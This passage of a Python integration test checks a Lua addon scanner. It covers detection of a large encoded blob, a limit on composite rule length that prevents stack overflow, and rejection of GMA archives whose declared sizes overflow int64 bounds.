                'local payload = "' + "QUJD" * (size // 4) + '"' + chr(10) + tail_line,
                encoding="utf-8")
            found = ids(run(huge, "blob-%d" % size))
            assert "LUA-052" in found, (
                "a %d-character blob was not reported: %s" % (size, sorted(found)))
            checks += 1

        # A flat `a and b and c` chain is parsed in a loop but builds a tree one
        # level deep per term, and evaluating or destroying that tree recurses.
        # Twenty thousand terms overflowed the stack in a release build; the
        # debug build, whose frames are larger, went down at two thousand.
        wide_rules = work / "wide-composite"
        wide_rules.mkdir()
        for name in rule_files:
            if (rules / name).is_file() and name != "composite_rules.txt":
                shutil.copy(rules / name, wide_rules / name)
        for terms, expected_exit in ((256, 1), (257, 2), (50000, 2)):
            (wide_rules / "composite_rules.txt").write_text(
                "LUA-001 " + "and LUA-001 " * (terms - 1)
                + ";;;[HIGH] COMP-900 Wide;;;hint" + chr(10), encoding="utf-8")
            answer = subprocess.run(
                [str(scanner), "-d", str(blocked), "-o", str(work / "output" / "wide-composite"),
                 "--rules", str(wide_rules), "-q"],
                cwd=work, capture_output=True, text=True, timeout=120)
            assert answer.returncode == expected_exit, (
                "a composite of %d terms exited %d, expected %d"
                % (terms, answer.returncode, expected_exit))
            if expected_exit == 2:
                assert "terms" in (answer.stdout + answer.stderr), (
                    "%d terms: the error does not say what the limit is: %s"
                    % (terms, answer.stderr))
            checks += 1

        # The archive reader's size checks are what keeps a declared length from
        # running away with the offset arithmetic. int64 bounds belong in the
        # same list as the truncations.
        boundaries = {
            "gma-int64-max": (head + meta + gma_entry(1, "lua/a.lua", (1 << 63) - 1)
                              + struct.pack("<I", 0), "size out of range"),
            "gma-int64-min": (head + meta + gma_entry(1, "lua/a.lua", -(1 << 63))
                              + struct.pack("<I", 0), "size out of range"),
            "gma-sum-overflows": (head + meta
                                  + b"".join(gma_entry(index, "lua/f%d.lua" % index, (1 << 62))
                                             for index in range(1, 5))
                                  + struct.pack("<I", 0), "size out of range"),
        }
        for name, (blob, expected) in boundaries.items():
            folder = work / name
            folder.mkdir()
            (folder / "addon.gma").write_bytes(blob)
            rejected_blob = run(folder, name, expected=3)
            listed = rejected_blob["unscanned"]["files"]
            assert listed, "%s was not recorded as unscanned" % name
            assert expected in listed[0]["detail"], "%s: %s" % (name, listed[0]["detail"])
        checks += 1

        print(f"integration: {checks} scanner runs passed")


if __name__ == "__main__":
    main()
